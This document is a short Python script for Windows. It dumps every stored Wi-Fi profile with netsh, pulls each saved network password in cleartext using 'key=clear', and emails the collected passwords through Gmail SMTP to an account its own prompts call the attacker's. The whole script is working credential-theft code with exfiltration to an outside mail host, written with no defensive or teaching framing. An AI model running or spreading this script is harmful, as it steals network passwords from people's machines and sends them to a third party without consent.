import subprocess
import re
import sys

show_all_profiles_command= "netsh wlan show profile"
all_profiles_results =subprocess.check_output(show_all_profiles_command, shell=True)
#print(all_profiles_results.decode(sys.stdout.encoding))

sorting_profiles= all_profiles_results.decode(sys.stdout.encoding)
regex_pattern = '(?:Profile\s*:\s)(.*)'
all_profile_names= re.findall(regex_pattern, sorting_profiles)
new_lines=[x.rstrip() for x in all_profile_names]
#print(new_lines)

password_result=""
for network_list in new_lines:
	showing_passwords_command='netsh wlan show profile name=\"'+network_list+'\" key=clear'
	showing_passwords_results=subprocess.check_output(showing_passwords_command, shell=True)
	showing_passwords_resultes=showing_passwords_results.decode(encoding='windows-1252')
	password_result += showing_passwords_resultes
print(password_result)

import smtplib
from getpass import getpass

host ='smtp.gmail.com'
port ='587'
server = smtplib.SMTP(host, port)
server.starttls()
email_address=input("enter the attackers email address here:  ")
email_password=getpass("enter the attackers password: ")
server.login(email_address, email_password)
password_message= password_result
server.sendmail(email_address, email_address, password_message)
server.quit()#loging out from the server
